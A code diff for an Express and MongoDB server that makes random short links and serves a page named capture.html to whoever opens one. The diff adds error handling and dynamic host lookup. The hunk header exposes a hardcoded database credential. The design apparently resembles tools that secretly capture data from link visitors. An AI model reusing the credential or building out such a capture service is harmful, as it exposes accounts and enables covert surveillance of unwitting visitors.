@@ -11,33 +11,42 @@ mongoose.connect(process.env.MONGODB_URI || 'mongodb+srv://dartmino64:CXd21bYqri
   useUnifiedTopology: true
 });
 
-// Define URL schema and model
 const urlSchema = new mongoose.Schema({
   originalUrl: String,
   newUrl: String
 });
 const Url = mongoose.model('Url', urlSchema);
 
-// Middleware
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Routes
 app.post('/generate', async (req, res) => {
-  const { originalUrl } = req.body;
-  const newUrl = `https://your-domain.com/${Math.random().toString(36).substring(7)}`;
-  const url = new Url({ originalUrl, newUrl });
-  await url.save();
-  res.json({ newUrl });
+  try {
+    const { originalUrl } = req.body;
+    const host = req.get('host'); // Get the host dynamically
+    const newUrl = `https://${host}/${Math.random().toString(36).substring(7)}`;
+    const url = new Url({ originalUrl, newUrl });
+    await url.save();
+    console.log('URL saved:', url);
+    res.json({ newUrl });
+  } catch (error) {
+    console.error('Error generating URL:', error);
+    res.status(500).send('Server error');
+  }
 });
 
 app.get('/:id', async (req, res) => {
-  const id = req.params.id;
-  const url = await Url.findOne({ newUrl: `https://your-domain.com/${id}` });
-  if (url) {
-    res.sendFile(path.join(__dirname, 'public', 'capture.html'));
-  } else {
-    res.status(404).send('Not Found');
+  try {
+    const id = req.params.id;
+    const url = await Url.findOne({ newUrl: `https://${req.get('host')}/${id}` });
+    if (url) {
+      res.sendFile(path.join(__dirname, 'public', 'capture.html'));
+    } else {
+      res.status(404).send('Not Found');
+    }
+  } catch (error) {
+    console.error('Error fetching URL:', error);
+    res.status(500).send('Server error');
   }
 });
 
